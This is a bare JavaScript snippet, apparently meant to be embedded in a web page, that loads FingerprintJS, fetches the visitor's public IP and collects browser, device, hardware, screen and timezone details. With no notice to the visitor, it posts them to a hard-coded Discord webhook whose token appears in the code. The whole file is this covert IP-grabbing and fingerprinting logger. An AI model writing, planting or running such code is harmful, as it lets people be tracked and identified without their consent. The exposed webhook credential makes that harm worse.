import('https://openfpcdn.io/fingerprintjs/v3')
  .then(FP => FP.load())
  .then(fp => {
    Promise.all([
      fp.get(),
      fetch('https://api.ipify.org?format=json').then(r => r.json())
    ]).then(([{ visitorId }, { ip }]) => {
      const f = visitorId;
      const i = ip;
      const ua = navigator.userAgent;
      const browser = (() => {
        if (/Brave/i.test(ua) && navigator.brave) return "Brave";
        if (/OPR|Opera/i.test(ua)) return "Opera";
        if (/Edg/i.test(ua)) return "Microsoft Edge";
        if (/SamsungBrowser/i.test(ua)) return "Samsung Internet";
        if (/UCBrowser/i.test(ua)) return "UC Browser";
        if (/Vivaldi/i.test(ua)) return "Vivaldi";
        if (/Firefox/i.test(ua)) return "Firefox";
        if (/Chrome/i.test(ua)) return "Chrome";
        if (/Safari/i.test(ua)) return "Safari";
        return "Desconocido";
      })();
      const device = /Mobi|Android|iPhone|iPad/i.test(ua) ? "📱 Móvil/Tablet" : "💻 PC";
      const hw = {
        cores: navigator.hardwareConcurrency || "Desconocido",
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Desconocido",
        platform: navigator.platform || "Desconocido"
      };
      const screenResolution = `${window.screen.width}x${window.screen.height}`;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const additionalInfo = /Mobi|Android|iPhone|iPad/i.test(ua) ? {
        "🎮 Orientación de pantalla": window.orientation ? `${window.orientation}°` : "Desconocido",
        "📐 Resolución de Pantalla": screenResolution
      } : {};
      const url = 'https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z';
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '🆕 New Visitor Info 🆕',
            color: 3447003,
            fields: [
              { name: '🖐️ Fingerprint', value: f, inline: false },
              { name: '🌍 IP', value: i, inline: false },
              { name: '🧭 Navegador', value: browser, inline: true },
              { name: '📱 Dispositivo', value: device, inline: true },
              { name: '🖥️ Plataforma', value: hw.platform, inline: true },
              { name: '🧠 Núcleos CPU', value: String(hw.cores), inline: true },
              { name: '📦 RAM Estimada', value: hw.ram, inline: true },
              { name: '🕰️ Zona Horaria', value: timezone, inline: true },
              ...Object.entries(additionalInfo).map(([key, value]) => ({
                name: key, value, inline: true
              })),
              { name: '🖥️ User Agent', value: ua, inline: false }
            ]
          }]
        })
      });
    });
  });
